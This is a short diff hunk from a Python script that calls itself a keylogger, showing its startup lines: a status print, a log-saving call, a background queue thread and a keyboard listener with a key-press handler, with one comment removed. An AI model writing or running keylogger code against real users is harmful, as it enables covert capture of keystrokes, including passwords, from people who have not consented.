@@ -55,7 +55,7 @@ def on_press(key):
 print("[*] Starting keylogger...")
 save_log()
 
-# Start queue processor thread
+
 threading.Thread(target=process_queue, daemon=True).start()
 
 with keyboard.Listener(on_press=on_press) as listener:
